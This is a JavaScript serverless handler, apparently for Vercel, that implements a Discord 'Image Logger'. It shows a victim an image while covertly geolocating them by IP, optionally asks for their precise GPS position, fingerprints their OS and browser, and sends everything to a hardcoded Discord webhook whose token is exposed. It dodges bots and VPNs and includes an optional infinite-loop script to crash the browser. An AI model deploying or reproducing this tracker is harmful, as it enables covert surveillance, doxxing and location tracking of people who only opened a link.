// Discord Image Logger - Convertido do código Python original
// Adaptado para funcionar no Vercel

const https = require('https');
const http = require('http');
const url = require('url');
const { Buffer } = require('buffer');

// Configuração
const config = {
    // BASE CONFIG
    "webhook": "https://discord.com/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu",
    "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg",
    "imageArgument": true,

    // CUSTOMIZATION
    "username": "Image Logger",
    "color": 0x00FFFF,

    // OPTIONS
    "crashBrowser": false,
    "accurateLocation": false,
    "message": {
        "doMessage": false,
        "message": "This browser has been pwned by Image Logger",
        "richMessage": true,
    },
    "vpnCheck": 1,
    "linkAlerts": true,
    "buggedImage": true,
    "antiBot": 1,
    "redirect": {
        "redirect": false,
        "page": "https://your-link.here"
    },
};

// Blacklisted IPs
const blacklistedIPs = ["27", "104", "143", "164"];

// Imagem de carregamento em base64
const loadingImageBase64 = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';

// Verifica se é um bot
function botCheck(ip, userAgent) {
    if (!ip) return false;
    
    if (ip.startsWith("34") || ip.startsWith("35")) {
        return "Discord";
    } else if (userAgent && userAgent.startsWith("TelegramBot")) {
        return "Telegram";
    }
    return false;
}

// Relata erros
function reportError(error) {
    try {
        const data = JSON.stringify({
            username: config.username,
            content: "@everyone",
            embeds: [
                {
                    title: "Image Logger - Error",
                    color: config.color,
                    description: `An error occurred while trying to log an IP!\n\n**Error:**\n\`\`\`\n${error}\n\`\`\``,
                }
            ],
        });

        const options = {
            hostname: 'discord.com',
            path: '/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length
            }
        };

        const req = https.request(options);
        req.write(data);
        req.end();
    } catch (e) {
        console.error("Error reporting to webhook:", e);
    }
}

// Detecta sistema operacional e navegador
function detectOsAndBrowser(userAgent) {
    let os = "Unknown";
    let browser = "Unknown";
    
    if (!userAgent) return { os, browser };
    
    // Sistema operacional
    if (userAgent.includes("Windows")) {
        os = "Windows";
    } else if (userAgent.includes("Mac OS")) {
        os = "MacOS";
    } else if (userAgent.includes("Linux")) {
        os = "Linux";
    } else if (userAgent.includes("Android")) {
        os = "Android";
    } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
        os = "iOS";
    }
    
    // Navegador
    if (userAgent.includes("Firefox")) {
        browser = "Firefox";
    } else if (userAgent.includes("Chrome")) {
        browser = "Chrome";
    } else if (userAgent.includes("Safari")) {
        browser = "Safari";
    } else if (userAgent.includes("Edge")) {
        browser = "Edge";
    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
        browser = "Opera";
    }
    
    return { os, browser };
}

// Função para fazer uma solicitação HTTP
async function makeHttpRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
        const lib = url.startsWith('https') ? https : http;
        const req = lib.request(url, options, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (e) {
                    resolve(data);
                }
            });
        });
        
        req.on('error', (e) => {
            reject(e);
        });
        
        req.end();
    });
}

// Faz um relatório
async function makeReport(ip, userAgent = '', coords = null, endpoint = "N/A", imageUrl = false) {
    // Verificar se o IP está na lista negra
    if (!ip || blacklistedIPs.some(prefix => ip.startsWith(prefix))) {
        return;
    }
    
    // Verificar se é um bot
    const bot = botCheck(ip, userAgent);
    if (bot) {
        if (config.linkAlerts) {
            try {
                const data = JSON.stringify({
                    username: config.username,
                    content: "",
                    embeds: [
                        {
                            title: "Image Logger - Link Sent",
                            color: config.color,
                            description: `An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** \`${endpoint}\`\n**IP:** \`${ip}\`\n**Platform:** \`${bot}\``,
                        }
                    ],
                });

                const options = {
                    hostname: 'discord.com',
                    path: '/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu',
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Content-Length': data.length
                    }
                };

                const req = https.request(options);
                req.write(data);
                req.end();
            } catch (error) {
                console.error('Error sending bot alert:', error);
            }
        }
        return;
    }

    let ping = "@everyone";

    try {
        // Obter informações do IP
        const info = await makeHttpRequest(`http://ip-api.com/json/${ip}?fields=16976857`);
        
        // Verificar VPN
        if (info && info.proxy) {
            if (config.vpnCheck === 2) {
                return;
            }
            if (config.vpnCheck === 1) {
                ping = "";
            }
        }
        
        // Verificar bots
        if (info && info.hosting) {
            if (config.antiBot === 4) {
                if (!info.proxy) {
                    return;
                }
            }
            else if (config.antiBot === 3) {
                return;
            }
            else if (config.antiBot === 2) {
                if (!info.proxy) {
                    ping = "";
                }
            }
            else if (config.antiBot === 1) {
                ping = "";
            }
        }
        
        // Detectar sistema operacional e navegador
        const { os, browser } = detectOsAndBrowser(userAgent);
        
        // Formatar coordenadas e timezone
        let coordText = coords || (info && `${info.lat}, ${info.lon}`);
        let coordsForGoogle = coords ? coords : (info && `${info.lat},${info.lon}`);
        
        let timezoneText = 'Unknown';
        if (info && info.timezone) {
            const timezoneParts = info.timezone.split('/');
            if (timezoneParts.length >= 2) {
                timezoneText = `${timezoneParts[1].replace('_', ' ')} (${timezoneParts[0]})`;
            }
        }
        
        // Construir a mensagem
        const embedDescription = `**A User Opened the Original Image!**

**Endpoint:** \`${endpoint}\`
            
**IP Info:**
> **IP:** \`${ip || 'Unknown'}\`
> **Provider:** \`${info?.isp || 'Unknown'}\`
> **ASN:** \`${info?.as || 'Unknown'}\`
> **Country:** \`${info?.country || 'Unknown'}\`
> **Region:** \`${info?.regionName || 'Unknown'}\`
> **City:** \`${info?.city || 'Unknown'}\`
> **Coords:** \`${coordText || 'Unknown'}\` (${coords ? `Precise, [Google Maps](https://www.google.com/maps/search/google+map++${coordsForGoogle})` : 'Approximate'})
> **Timezone:** \`${timezoneText}\`
> **Mobile:** \`${info?.mobile || 'Unknown'}\`
> **VPN:** \`${info?.proxy || 'Unknown'}\`
> **Bot:** \`${info?.hosting && !info?.proxy ? 'Possibly' : (info?.hosting ? 'Possibly' : 'False')}\`

**PC Info:**
> **OS:** \`${os}\`
> **Browser:** \`${browser}\`

**User Agent:**
\`\`\`
${userAgent || 'Unknown'}
\`\`\``;

        const webhookData = {
            username: config.username,
            content: ping,
            embeds: [
                {
                    title: "Image Logger - IP Logged",
                    color: config.color,
                    description: embedDescription
                }
            ]
        };
        
        // Adicionar thumbnail se houver URL da imagem
        if (imageUrl) {
            webhookData.embeds[0].thumbnail = { url: imageUrl };
        }
        
        // Enviar para o webhook
        const data = JSON.stringify(webhookData);
        const options = {
            hostname: 'discord.com',
            path: '/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length
            }
        };

        const req = https.request(options);
        req.write(data);
        req.end();
        
        return info;
    } catch (error) {
        console.error('Error making report:', error);
        return null;
    }
}

// Handler principal para o Vercel
module.exports = async (req, res) => {
    try {
        // Obter informações da solicitação
        const parsedUrl = url.parse(req.url, true);
        const path = parsedUrl.pathname;
        const query = parsedUrl.query;
        
        // Obter informações do cliente
        const ip = req.headers['x-forwarded-for'] || 
                  req.headers['x-real-ip'] || 
                  req.connection.remoteAddress || 
                  'Unknown';
        const userAgent = req.headers['user-agent'] || '';
        
        // Processar a URL da imagem
        let imageUrl = config.image;
        if (config.imageArgument) {
            if (query.url || query.id) {
                try {
                    const encoded = query.url || query.id;
                    imageUrl = Buffer.from(encoded, 'base64').toString('utf-8');
                } catch (e) {
                    console.error('Error decoding URL:', e);
                    imageUrl = config.image;
                }
            }
        }

        // Verificar se é um bot
        if (botCheck(ip, userAgent)) {
            if (config.buggedImage) {
                // Fazer relatório para bots do Discord
                makeReport(ip, userAgent, null, req.url, imageUrl);
                
                // Enviar imagem bugada
                res.setHeader('Content-Type', 'image/jpeg');
                res.statusCode = 200;
                res.end(Buffer.from(loadingImageBase64, 'base64'));
                return;
            } else {
                // Fazer relatório para bots do Discord
                makeReport(ip, userAgent, null, req.url, imageUrl);
                
                // Redirecionar para a imagem
                res.setHeader('Location', imageUrl);
                res.statusCode = 302;
                res.end();
                return;
            }
        }
        
        // Processar localização
        let result = null;
        if (query.g && config.accurateLocation) {
            try {
                const location = Buffer.from(query.g, 'base64').toString('utf-8');
                result = await makeReport(ip, userAgent, location, req.url, imageUrl);
            } catch (e) {
                result = await makeReport(ip, userAgent, null, req.url, imageUrl);
            }
        } else {
            result = await makeReport(ip, userAgent, null, req.url, imageUrl);
        }
        
        // Criar HTML de resposta
        let htmlContent = `<style>body {
margin: 0;
padding: 0;
}
div.img {
background-image: url('${imageUrl}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}</style><div class="img"></div>`;

        // Processar mensagem personalizada
        if (config.message.doMessage && result && config.message.richMessage) {
            let message = config.message.message;
            
            // Substituir placeholders
            message = message.replace(/\{ip\}/g, ip || 'Unknown');
            message = message.replace(/\{isp\}/g, result?.isp || 'Unknown');
            message = message.replace(/\{asn\}/g, result?.as || 'Unknown');
            message = message.replace(/\{country\}/g, result?.country || 'Unknown');
            message = message.replace(/\{region\}/g, result?.regionName || 'Unknown');
            message = message.replace(/\{city\}/g, result?.city || 'Unknown');
            message = message.replace(/\{lat\}/g, result?.lat || 'Unknown');
            message = message.replace(/\{long\}/g, result?.lon || 'Unknown');
            
            // Timezone
            const timezone = result?.timezone || 'Unknown';
            const formattedTimezone = timezone !== 'Unknown' && timezone.includes('/') 
                ? `${timezone.split('/')[1].replace('_', ' ')} (${timezone.split('/')[0]})` 
                : 'Unknown';
            message = message.replace(/\{timezone\}/g, formattedTimezone);
            
            message = message.replace(/\{mobile\}/g, result?.mobile || 'Unknown');
            message = message.replace(/\{vpn\}/g, result?.proxy || 'Unknown');
            message = message.replace(/\{bot\}/g, result?.hosting && !result?.proxy ? 'Possibly' : (result?.hosting ? 'Possibly' : 'False'));
            
            // Informações do navegador e SO
            const { os, browser } = detectOsAndBrowser(userAgent);
            message = message.replace(/\{browser\}/g, browser);
            message = message.replace(/\{os\}/g, os);
            
            htmlContent = message;
        }
        
        // Adicionar script para travar o navegador
        if (config.crashBrowser) {
            htmlContent += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>';
        }
        
        // Adicionar redirecionamento
        if (config.redirect.redirect) {
            htmlContent = `<meta http-equiv="refresh" content="0;url=${config.redirect.page}">`;
        }
        
        // Adicionar script para localização precisa
        if (config.accurateLocation && !query.g) {
            htmlContent += `<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>`;
        }
        
        // Enviar resposta
        res.setHeader('Content-Type', 'text/html');
        res.statusCode = 200;
        res.end(htmlContent);
        
    } catch (error) {
        // Tratar erro
        console.error('Error:', error);
        reportError(error.stack || error.toString());
        
        res.setHeader('Content-Type', 'text/html');
        res.statusCode = 500;
        res.end('500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.');
    }
};
